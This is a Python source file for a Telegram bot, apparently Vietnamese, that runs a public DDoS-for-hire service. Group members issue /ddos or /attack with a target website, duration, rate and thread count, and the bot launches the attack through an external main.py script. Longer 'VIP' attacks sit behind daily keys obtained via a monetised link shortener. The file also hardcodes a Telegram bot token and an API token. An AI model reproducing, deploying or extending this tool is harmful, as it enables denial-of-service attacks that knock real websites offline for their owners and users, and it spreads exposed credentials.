
import telebot
import random
import datetime
import time
import os, sys, re
import subprocess
import requests
import schedule
from concurrent.futures import ThreadPoolExecutor
import pytz
import threading

# --- CẤU HÌNH CƠ BẢN CỦA BOT ---
threading_pool = ThreadPoolExecutor(max_workers=int(100000))
bot_token = '7674870566:AAFFpTcMfzMatLyyAvgjpVngJmpfuw5e8MA' 
bot = telebot.TeleBot(bot_token)
processes = {}
chan_spam = {}
running_attacks = {}  # Theo dõi các cuộc tấn công đang chạy
attack_slots = {"normal": 0, "vip": 0}  # Theo dõi slot

# --- CẤU HÌNH CỦA NGƯỜI DÙNG ---
ADMIN_ID = '6684542694'
ID_GROUP = '1002812130386' # ID Nhóm không có dấu gạch nối
link_gr = "https://t.me/smsjoonwuy"
web_key_base_url = "https://sublikevip.site/index.html?key=" # URL gốc của trang chứa key
user_bot = "@ddos_attack_bot"
admin_user = "@joonwuy"
zalo = "https://zalo.me/g/dqacsy523"
delay_normal = 60  # Delay cho lệnh normal
delay_vip = 120    # Delay cho lệnh vip
MAX_SLOTS = 2      # Tổng số slot tối đa

def get_shortened_link(url: str):
    try:
        token = "703371951353e080dde13a50207e2ff7c3fc31fe88f765c17fa11d9fd1046528"
        api_url = f"https://yeumoney.com/QL_api.php?token={token}&format=json&url={url}"
        response = requests.get(api_url, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"Lỗi với API rút gọn link: {e}")
        return {"status": "error", "message": f"Lỗi Mạng: {e}"}

def getvideo():
    """Lấy một URL video ngẫu nhiên từ danh sách JSON."""
    try:
        video_list_url = "https://raw.githubusercontent.com/nguyenductai206/list/refs/heads/main/listvideo.json"
        return random.choice(requests.get(video_list_url).json())
    except Exception as e:
        print(f"Không thể lấy video: {e}")
        return None

def xoatn(message, dl): 
    """Xóa một tin nhắn sau một khoảng thời gian chờ được chỉ định."""
    time.sleep(dl)
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception as e:
        print(f"Không thể xóa tin nhắn: {e}")

def getfullname(message):
    """Lấy họ và tên đầy đủ của người dùng."""
    try:
        full_name = f"{message.from_user.first_name} {message.from_user.last_name}".strip()
        return full_name if full_name else "Chưa xác định"
    except:
        return "Chưa xác định"

def checkgroup(message):
    """Kiểm tra xem tin nhắn có đến từ supergroup được cho phép hay không."""
    if message.chat.type == "supergroup" and message.chat.id == -int(ID_GROUP):
        return True
    else:
        full_name = getfullname(message)
        bot.send_message(
            message.chat.id, 
            f"<b>🗺️ Chào mừng {full_name} đến với bot DDoS attack trên telegram !\nVui lòng sử dụng bot trong nhóm chính thức.\n<blockquote>Link: {link_gr}</blockquote></b>", 
            parse_mode='HTML'
        )
        return False

def get_current_vietnam_time():
    """Lấy thời gian hiện tại theo múi giờ Việt Nam."""
    vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
    return datetime.datetime.now(vietnam_tz)

def get_current_vietnam_date():
    """Lấy ngày hiện tại theo múi giờ Việt Nam."""
    return get_current_vietnam_time().date()

def get_vietnam_day_of_month():
    """Lấy ngày trong tháng theo múi giờ Việt Nam."""
    return get_current_vietnam_date().day

def TimeStamp():
    """Trả về ngày hiện tại theo múi giờ Việt Nam."""
    vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
    now = datetime.datetime.now(vietnam_tz)
    return now.strftime("%d/%m/%Y")

def get_total_slots():
    """Tính tổng số slot đang sử dụng."""
    return len(running_attacks)

def validate_url(url):
    """Kiểm tra URL có hợp lệ không."""
    url_pattern = re.compile(
        r'^https?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return url_pattern.match(url) is not None

def run_ddos_attack(user_id, website, time_sec, rate, thread, attack_type):
    """Chạy cuộc tấn công DDoS và quản lý slot."""
    attack_id = f"{user_id}_{website}_{int(time.time())}"
    
    try:
        # Chạy lệnh DDoS
        process = subprocess.Popen([
            "python", "main.py", website, str(time_sec), str(rate), str(thread)
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        running_attacks[attack_id] = {
            "process": process,
            "type": attack_type,
            "start_time": time.time(),
            "duration": time_sec
        }
        
        # Chờ process kết thúc hoặc timeout
        process.wait(timeout=time_sec + 10)
        
    except subprocess.TimeoutExpired:
        # Nếu timeout, kill process
        process.kill()
        process.wait()
    except Exception as e:
        print(f"Lỗi khi chạy DDoS: {e}")
    finally:
        # Giải phóng slot
        if attack_id in running_attacks:
            del running_attacks[attack_id]

# --- CÁC HÀM XỬ LÝ LỆNH CỦA BOT ---

@bot.message_handler(commands=['start'])
def start(message):
    """Xử lý lệnh /start, hướng dẫn người dùng vào nhóm."""
    if message.chat.type == "private":
        full_name = getfullname(message)
        bot.send_message(
            message.chat.id, 
            f"<b>🗺️ Chào mừng {full_name} đến với bot DDoS attack trên telegram !\nNhấp vào link bên dưới để chuyển sang nhóm\n<blockquote>Link: {link_gr}</blockquote></b>", 
            parse_mode='HTML'
        )

@bot.message_handler(commands=['getkey'])
def startkey(message):
    """Tạo và cung cấp một liên kết rút gọn để người dùng lấy key hàng ngày."""
    if not checkgroup(message): return

    msg = bot.reply_to(message, text='⏳ Đang tạo link của bạn, vui lòng chờ...')

    user_id = message.from_user.id
    day_of_month = get_vietnam_day_of_month()
    key = f"ddos{user_id * day_of_month - 126 * day_of_month}"

    original_url = web_key_base_url + key
    shorten_response = get_shortened_link(original_url)

    if shorten_response.get('status') == 'success':
        link_to_show = shorten_response.get('shortenedUrl', original_url)
        text = f'''
- LINK LẤY KEY NGÀY <i>{TimeStamp()}</i> CỦA BẠN LÀ: {link_to_show} -
- VƯỢT CAPTCHA ĐỂ LẤY KEY -
- KHI CÓ KEY, DÙNG LỆNH /key &lt;key&gt; ĐỂ TIẾP TỤC -
        '''
        bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode="HTML")
    else:
        error_msg = shorten_response.get('message', 'Lỗi không xác định.')
        bot.edit_message_text(f"❌ **Lỗi khi tạo link:** {error_msg}\nVui lòng thử lại sau.", chat_id=msg.chat.id, message_id=msg.message_id)

@bot.message_handler(commands=['key'])
def key(message):
    """Cho phép người dùng nhập key để mở khóa lệnh /attack."""
    if not checkgroup(message): return

    if len(message.text.split()) == 1:
        bot.reply_to(message, '<strong>VUI LÒNG NHẬP KEY.</strong>\nVí dụ: /key abc1234', parse_mode="HTML")
        return

    user_id = message.from_user.id
    submitted_key = message.text.split()[1]
    day_of_month = get_vietnam_day_of_month()

    expected_key = f"ddos{user_id * day_of_month - 126 * day_of_month}"

    if submitted_key == expected_key:
        key_dir = os.path.join(os.getcwd(), "user", str(day_of_month))
        os.makedirs(key_dir, exist_ok=True)
        with open(os.path.join(key_dir, f"{user_id}.txt"), "w") as f:
            f.write("")

        bot.reply_to(message, '✅ KEY HỢP LỆ. Bạn đã được phép sử dụng lệnh /attack.')
    else:
        bot.reply_to(message, '❌ KEY KHÔNG ĐÚNG. Vui lòng dùng /getkey để lấy key chính xác cho hôm nay.')

@bot.message_handler(commands=['ddos'])
def ddos_normal(message):
    """Xử lý lệnh DDoS thường (giới hạn 30 giây)."""
    if not checkgroup(message): return

    user_id = str(message.from_user.id)

    # Kiểm tra slot
    if get_total_slots() >= MAX_SLOTS:
        bot.reply_to(message, f'❌ Đã hết slot! Hiện tại đang có {get_total_slots()}/{MAX_SLOTS} cuộc tấn công đang chạy. Vui lòng chờ.')
        return

    # Xác thực các tham số của lệnh
    args = message.text.split()
    if len(args) < 5:
        bot.reply_to(message, 'Sai định dạng lệnh. Dùng: /ddos <website> <time> <rate> <thread>')
        return

    website, time_input, rate, thread = args[1], args[2], args[3], args[4]

    # Validate parameters
    if not validate_url(website):
        bot.reply_to(message, '❌ URL không hợp lệ!')
        return

    try:
        time_sec = int(time_input)
        rate_val = int(rate)
        thread_val = int(thread)
    except ValueError:
        bot.reply_to(message, '❌ Các tham số phải là số!')
        return

    if not (1 <= time_sec <= 30):
        bot.reply_to(message, "❌ Thời gian phải từ 1 đến 30 giây cho lệnh thường.")
        return

    if not (1 <= rate_val <= 100):
        bot.reply_to(message, "❌ Rate phải từ 1 đến 100.")
        return

    if not (1 <= thread_val <= 100):
        bot.reply_to(message, "❌ Thread phải từ 1 đến 100.")
        return

    # Kiểm tra thời gian chờ
    if user_id in chan_spam:
        elapsed = int(time.time() - chan_spam[user_id])
        if elapsed <= delay_normal:
            bot.reply_to(message, f"Vui lòng chờ thêm {delay_normal - elapsed} giây trước lần tấn công tiếp theo.")
            return

    # Bắt đầu tấn công
    chan_spam[user_id] = time.time()

    current_time = get_current_vietnam_time().strftime("%H:%M:%S %d/%m/%Y")
    text = f'<strong>🚀 Bắt Đầu Tấn Công DDoS Cho {getfullname(message)} 🚀</strong>\n<blockquote>┌ Bot 👾: {user_bot} \n├ Target 🎯: {website}\n├ Thời gian: {time_sec}s\n├ Rate: {rate_val}\n├ Thread: {thread_val}\n├ Thời điểm: {current_time}\n├ Chủ sở hữu 👑: {admin_user}\n└ Loại: Normal</blockquote>'

    # Chạy tấn công trong thread riêng
    threading_pool.submit(run_ddos_attack, user_id, website, time_sec, rate_val, thread_val, "normal")

    xoatn(message, 2)
    bot.send_video(message.chat.id, video=getvideo(), caption=text, supports_streaming=True, parse_mode='HTML')

@bot.message_handler(commands=['attack'])
def ddos_vip(message):
    """Xử lý lệnh DDoS VIP (giới hạn 300 giây)."""
    if not checkgroup(message): return

    user_id = str(message.from_user.id)
    day_of_month = str(get_vietnam_day_of_month())

    # Kiểm tra key
    if not os.path.exists(f"./user/{day_of_month}/{user_id}.txt"):
        bot.reply_to(message, 'Bạn cần có key cho hôm nay. Dùng /getkey và sau đó /key để nhập key.')
        return

    # Kiểm tra slot
    if get_total_slots() >= MAX_SLOTS:
        bot.reply_to(message, f'❌ Đã hết slot! Hiện tại đang có {get_total_slots()}/{MAX_SLOTS} cuộc tấn công đang chạy. Vui lòng chờ.')
        return

    # Xác thực các tham số của lệnh
    args = message.text.split()
    if len(args) < 5:
        bot.reply_to(message, 'Sai định dạng lệnh. Dùng: /attack <website> <time> <rate> <thread>')
        return

    website, time_input, rate, thread = args[1], args[2], args[3], args[4]

    # Validate parameters
    if not validate_url(website):
        bot.reply_to(message, '❌ URL không hợp lệ!')
        return

    try:
        time_sec = int(time_input)
        rate_val = int(rate)
        thread_val = int(thread)
    except ValueError:
        bot.reply_to(message, '❌ Các tham số phải là số!')
        return

    if not (1 <= time_sec <= 300):
        bot.reply_to(message, "❌ Thời gian phải từ 1 đến 300 giây cho lệnh VIP.")
        return

    if not (1 <= rate_val <= 200):
        bot.reply_to(message, "❌ Rate phải từ 1 đến 200.")
        return

    if not (1 <= thread_val <= 200):
        bot.reply_to(message, "❌ Thread phải từ 1 đến 200.")
        return

    # Kiểm tra thời gian chờ VIP
    if user_id in chan_spam:
        elapsed = int(time.time() - chan_spam[user_id])
        if elapsed <= delay_vip:
            bot.reply_to(message, f"Vui lòng chờ thêm {delay_vip - elapsed} giây trước lần tấn công tiếp theo.")
            return

    # Bắt đầu tấn công VIP
    chan_spam[user_id] = time.time()

    current_time = get_current_vietnam_time().strftime("%H:%M:%S %d/%m/%Y")
    text = f'<strong>🚀 Bắt Đầu Tấn Công DDoS VIP Cho {getfullname(message)} 🚀</strong>\n<blockquote>┌ Bot 👾: {user_bot} \n├ Target 🎯: {website}\n├ Thời gian: {time_sec}s\n├ Rate: {rate_val}\n├ Thread: {thread_val}\n├ Thời điểm: {current_time}\n├ Chủ sở hữu 👑: {admin_user}\n└ Loại: VIP</blockquote>'

    # Chạy tấn công trong thread riêng
    threading_pool.submit(run_ddos_attack, user_id, website, time_sec, rate_val, thread_val, "vip")

    xoatn(message, 2)
    bot.send_video(message.chat.id, video=getvideo(), caption=text, supports_streaming=True, parse_mode='HTML')

@bot.message_handler(commands=['status'])
def status(message):
    """Hiển thị trạng thái slot và các cuộc tấn công đang chạy."""
    if not checkgroup(message): return

    total_slots = get_total_slots()
    status_text = f"📊 **Trạng thái hệ thống:**\n"
    status_text += f"🎯 Slot đang sử dụng: {total_slots}/{MAX_SLOTS}\n\n"

    if running_attacks:
        status_text += "🔥 **Các cuộc tấn công đang chạy:**\n"
        for attack_id, attack_info in running_attacks.items():
            elapsed = int(time.time() - attack_info['start_time'])
            remaining = max(0, attack_info['duration'] - elapsed)
            status_text += f"• Loại: {attack_info['type'].upper()} | Còn lại: {remaining}s\n"
    else:
        status_text += "✅ Không có cuộc tấn công nào đang chạy."

    bot.reply_to(message, status_text, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help(message):
    if not checkgroup(message): return
    text = f"""
<b>Chào mừng đến với <i>bot DDoS của tôi!</i></b>
<u>Các lệnh của bot:</u>
  <code>/help</code> - Xem các lệnh.
  <code>/getkey</code> - Lấy key hàng ngày (cho lệnh VIP).
  <code>/key &lt;key&gt;</code> - Nhập key để mở khóa lệnh VIP.
  <code>/ddos &lt;website&gt; &lt;time&gt; &lt;rate&gt; &lt;thread&gt;</code> - Tấn công DDoS thường (max 30s).
  <code>/attack &lt;website&gt; &lt;time&gt; &lt;rate&gt; &lt;thread&gt;</code> - Tấn công DDoS VIP (max 300s).
  <code>/status</code> - Xem trạng thái slot và cuộc tấn công.
  ──────────────────────────
  📝 <b>Lưu ý:</b>
  • Chỉ được chạy tối đa {MAX_SLOTS} cuộc tấn công cùng lúc
  • Lệnh /ddos: giới hạn 30 giây, delay {delay_normal}s
  • Lệnh /attack: giới hạn 300 giây, delay {delay_vip}s, cần key
  ──────────────────────────
  <a href="{zalo}">Bấm vào đây để tham gia nhóm Zalo.</a>
    """
    bot.send_message(message.chat.id, text, parse_mode="HTML")

# --- BẮT ĐẦU CHẠY BOT ---
print("DDoS Bot đang chạy...")
bot.infinity_polling()
